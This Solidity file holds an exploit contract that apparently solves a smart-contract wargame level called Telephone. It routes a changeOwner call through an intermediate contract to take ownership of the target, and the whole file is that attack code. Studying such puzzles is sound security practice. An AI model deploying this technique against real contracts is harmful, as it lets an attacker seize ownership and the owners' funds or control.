pragma solidity 0.8.4;

interface TelephoneInterface { // to access related methods of the Telephone contract
	function changeOwner(address _owner) external;
}

contract TelephoneExploit{

	// Variables & Declarations
	address telephoneAddr;

	// Constructor
	constructor(address _addr) public{
		telephoneAddr = _addr;
	}

	// Methods
	function attack(address _addr) public {
		// Access to Target
		TelephoneInterface ti = TelephoneInterface(telephoneAddr);

		// Change the Owner
		ti.changeOwner(_addr);
	}
}